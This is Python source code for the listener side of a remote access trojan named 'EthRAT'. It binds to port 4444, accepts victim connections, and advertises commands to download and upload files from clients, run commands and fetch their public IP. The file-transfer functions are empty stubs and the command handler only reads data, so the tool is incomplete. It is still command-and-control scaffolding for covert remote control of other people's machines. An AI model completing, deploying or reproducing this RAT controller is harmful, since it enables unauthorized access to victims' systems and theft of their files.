import socket
import threading
import os
import ctypes
import queue
from datetime import datetime
import struct
import sys

# Colors
cyan = "\033[1;36m"
red = "\033[1;31m"
green = "\033[38;5;82m"
yellow = "\033[1;33m"
white = "\033[39m"
reset = "\033[0m"
blue = "\033[1;34m"
purple = "\033[1;35m"

clients = {}
server_active = True

LHOST = "0.0.0.0"
LPORT = 4444

logo = red + r"""
##################################
 _____ _   _    ______  ___ _____ 
|  ___| | | |   | ___ \/ _ \_   _|
| |__ | |_| |__ | |_/ / /_\ \| |  
|  __|| __| '_ \|    /|  _  || |  
| |___| |_| | | | |\ \| | | || |  
\____/ \__|_| |_\_| \_\_| |_/\_/  

##################################
""" + reset + "\n\n"


def help(self):
    """ Help Menu """
    print(green + """
    | ------------------ | -----------------------------------------|
    |      Commands      |                Description               |
    | ------------------ | -----------------------------------------|
    |       help         | Display help menu                        |
    |       kill         | Kill connection with client              |
    |       download     | Download file/directory from client      |
    |       upload       | Upload file/directory to client          |
    |       !exec        | Execute a local command                  |
    |       cd           | Browse to a directory                    |
    |       getip        | Get the clients public IP                |
    | ------------------ | -----------------------------------------|
    """ + reset)

def window_title(clients):
        if os.name == "nt":
                ctypes.windll.kernel32.SetConsoleTitleW(f"EthRAT | CONNECTED CLIENTS: {len(clients)}")


def handle_client(socket):
        try:
            client_socket, addr = socket.accept()
            clients[addr] = client_socket
            print(f"\n{green}[+]{reset} Client connected: {addr[0]}:{addr[1]}\n")
            window_title(clients)

            threading.Thread(target=handle_client_commands, args=(client_socket, addr), daemon=True).start()
           
        except (ConnectionResetError, OSError) as e:
             print(f"{red}[-]{reset} Client error: {e}")
             if addr in clients:
                del clients[addr]
                window_title(clients)

def handle_client_commands(client_socket, addr):
     try:
          while server_active:
            command = client_socket.recv(1024).decode()
            if not command:
                 break
     except (ConnectionResetError, ConnectionAbortedError):
        print(f"{red}[-]{reset} Client {addr[0]} disconnected\n")
        client_socket.close()
        if addr in clients:
            del clients[addr]
            window_title(clients)

def send(sock, data):
  """ Bulk Send Commands And Data """
  try:
      sock.sendall(struct.pack('>I', len(data)) + data)
  except (ConnectionError, OSError) as e:
        print(f"Send failed: {e}")

def recv(sock):
    """ Receive First Letter, Then Return the rest """
    try:
        data_size = recvall(sock, 4)
        if not data_size:
            return b''
        data_len = struct.unpack('>I', data_size)[0]
        return recvall(sock, data_len)
    except (ConnectionError, struct.error) as e:
        print(f"Receive failed: {e}")

def recvall(sock, n):
  """ Bulk Receive Data, Including Files and Whatnot """
  packet = b''
  while len(packet) < n:
    chunk = sock.recv(n - len(packet))
    if not chunk:
      return None
    packet += chunk
  return packet

def download():
    pass

def save_file():
    pass

def upload():
    pass

def start_server(lhost, lport):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, lport))
        sock.listen(5)
        
        os.system("cls" if os.name == "nt" else "clear")
        print(logo)
        print(yellow + "[*] Server Started On {}:{} < at [{}]".format(lhost, lport, datetime.now().strftime("%H:%M:%S")) + reset)

        while server_active:
            handle_client(sock)
    except (KeyboardInterrupt, EOFError):
        print("Keyboard Interruption")
        sys.exit(1)
    except (socket.error, OSError) as e:
        print(f"Error: {e}")
        sys.exit(1)
    finally:
        sock.close()


if __name__ == "__main__":
    start_server(LHOST, LPORT)